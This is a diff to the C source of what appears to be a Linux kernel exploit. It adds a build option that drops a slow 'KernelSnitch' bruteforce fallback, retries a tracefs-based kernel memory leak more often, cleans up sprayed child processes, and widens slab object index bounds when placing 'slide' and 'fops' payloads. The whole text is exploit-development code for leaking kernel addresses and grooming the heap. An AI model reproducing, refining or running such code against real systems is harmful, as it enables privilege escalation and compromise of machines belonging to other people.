@@ -2057,6 +2057,8 @@ static void cleanup_failed_kernel_page(const char *reason) {
 
 #if !defined(APP_CONTROLLED_MM_GROUP_RECLAIM) || \
     !APP_CONTROLLED_MM_GROUP_RECLAIM
+#if !defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) || \
+    !APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
 static void setup_kernel_page_kernelsnitch(int payload_mode, int cpu_count) {
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
   ks = kernelsnitch_setup(
@@ -2093,6 +2095,7 @@ static void setup_kernel_page_kernelsnitch(int payload_mode, int cpu_count) {
 #endif
 }
 #endif
+#endif
 
 uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_CONTROLLED_MM_GROUP_RECLAIM) && \
@@ -2116,6 +2119,14 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
   trace_window = tracefs_mm_available();
 #endif
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+  if (!trace_window) {
+    pr_warning("mm trace unavailable; refusing KernelSnitch fallback\n");
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
   }
@@ -2131,13 +2142,19 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   touch_mm_slabinfo();
 #endif
 
+#if !defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) || \
+    !APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+#endif
   uintptr_t leaked = 0;
   uintptr_t base = 0;
   int mm_leaked_ready = 0;
 
   if (!trace_window) {
+#if !defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) || \
+    !APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
     setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
+#endif
   }
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
   if (trace_window) {
@@ -2145,12 +2162,33 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     tracefs_mm_baseline();
   }
 #endif
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+  if (!trace_window) {
+    pr_warning("mm trace window could not be armed; refusing KernelSnitch fallback\n");
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+      kill_child(spray_ctx.childs[i]);
+      spray_ctx.childs[i] = -1;
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
 #if defined(APP_TRACEFS_MM_LEAK) && APP_TRACEFS_MM_LEAK
   /*
    * A tracefs miss costs a few hundred milliseconds, a KernelSnitch fallback
    * tens of seconds, so refresh the window before paying for a bruteforce.
    */
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+  const int mm_trace_attempts = trace_window ? 8 : 1;
+#else
   const int mm_trace_attempts = trace_window ? 3 : 1;
+#endif
   int trace_attempted = 0;
   for (int mm_trace_attempt = 0; mm_trace_attempt < mm_trace_attempts;
        mm_trace_attempt++) {
@@ -2192,6 +2230,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     }
     size_t mm_min_index = APP_SLIDE_MIN_OBJECT_INDEX;
     size_t mm_max_index = APP_SLIDE_MAX_OBJECT_INDEX;
+    /* Tracefs identifies the exact held child. Its slab object index does not
+     * affect the payload layout, unlike an unverified KernelSnitch candidate. */
+    if (trace_window && payload_mode == PAGE_PAYLOAD_SLIDE) {
+      mm_min_index = 0;
+      mm_max_index = mm_objs_per_slab - 1;
+    }
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && defined(APP_FOPS_MIN_OBJECT_INDEX)
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       mm_min_index = APP_FOPS_MIN_OBJECT_INDEX;
@@ -2219,9 +2263,33 @@ uintptr_t prepare_kernel_page(int payload_mode) {
       SYSCHK(waitpid(child_leak, NULL, 0));
       child_leak = -1;
     }
+#if defined(APP_TRACEFS_MM_NO_KSNITCH_FALLBACK) && \
+    APP_TRACEFS_MM_NO_KSNITCH_FALLBACK
+    pr_warning("mm trace leak missed %d attempts; refusing KernelSnitch fallback\n",
+               mm_trace_attempts);
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+      prepare_ctx.childs[i] = -1;
+    }
+    for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
+      kill_child(spray_ctx.childs[i]);
+      spray_ctx.childs[i] = -1;
+    }
+    for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
+      kill_child(pre_ctx.childs[i]);
+      pre_ctx.childs[i] = -1;
+    }
+    for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
+      kill_child(post_ctx.childs[i]);
+      post_ctx.childs[i] = -1;
+    }
+    cleanup_page_prepare_state();
+    return 0;
+#else
     pr_info("mm trace leak unavailable; using KernelSnitch\n");
     setup_kernel_page_kernelsnitch(payload_mode, cpu_count);
     child_leak = clone_leak_child();
+#endif
   }
 #else
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
@@ -2338,7 +2406,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_SLIDE_MIN_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+  if (!mm_leaked_ready && payload_mode == PAGE_PAYLOAD_SLIDE &&
       object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
     pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
                object_index, APP_SLIDE_MIN_OBJECT_INDEX);
@@ -2355,7 +2423,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 #endif
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(APP_SLIDE_MAX_OBJECT_INDEX)
-  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+  if (!mm_leaked_ready && payload_mode == PAGE_PAYLOAD_SLIDE &&
       object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
     pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
                object_index, APP_SLIDE_MAX_OBJECT_INDEX);
